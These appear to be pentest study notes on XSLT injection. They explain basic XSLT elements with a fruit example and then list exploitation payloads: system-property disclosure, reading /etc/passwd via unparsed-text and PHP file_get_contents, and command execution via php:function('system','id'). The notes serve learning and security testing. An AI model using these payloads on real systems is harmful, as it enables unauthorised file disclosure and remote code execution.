# XSLT Injection
- eXtensible Stylesheet Language Transformation (XSLT) is a language enabling the transformation of XML documents. For instance, it can select specific nodes from an XML document and change the XML structure.


- XSLT can be used to define a data format which is subsequently enriched with data from the XML document.
- XSLT data is structured similarly to XML. However, it contains XSL elements within nodes prefixed with the `xsl-prefix`. 
- The following are some commonly used XSL elements:
    - `<xsl:template>`: This element indicates an XSL template. It can contain a `match` attribute that contains a path in the XML document that the template applies to
    - `<xsl:value-of>`: This element extracts the value of the XML node specified in the `select` attribute
    - `<xsl:for-each>`: This element enables looping over all XML nodes specified in the `select` attribute

```xml
<?xml version="1.0" encoding="UTF-8"?>
<fruits>
    <fruit>
        <name>Apple</name>
        <color>Red</color>
        <size>Medium</size>
    </fruit>
    <fruit>
        <name>Banana</name>
        <color>Yellow</color>
        <size>Medium</size>
    </fruit>
    <fruit>
        <name>Strawberry</name>
        <color>Red</color>
        <size>Small</size>
    </fruit>
</fruits>
```
```xslt
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
	<xsl:template match="/fruits">
		Here are all the fruits:
		<xsl:for-each select="fruit">
			<xsl:value-of select="name"/> (<xsl:value-of select="color"/>)
		</xsl:for-each>
	</xsl:template>
</xsl:stylesheet>
```
- Identifying XSLT Injection: Inserting `<`
- **Exploiting**
    - Information Disclosure
    ```xml
    Version: <xsl:value-of select="system-property('xsl:version')" />
    <br/>
    Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
    <br/>
    Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
    <br/>
    Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
    <br/>
    Product Version: <xsl:value-of select="system-property('xsl:product-version')" />
    ```
    - Local File Inclusion (LFI)
    ```xml
    <xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
    ```
    If the XSLT library is configured to support PHP functions, we can call the PHP function file_get_contents using the following XSLT element:
    ```xml
    <xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
    ```
    - Remote Code Execution (RCE)
    ```xml
    <xsl:value-of select="php:function('system','id')" />
    ```

## Resources
- [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT%20Injection)
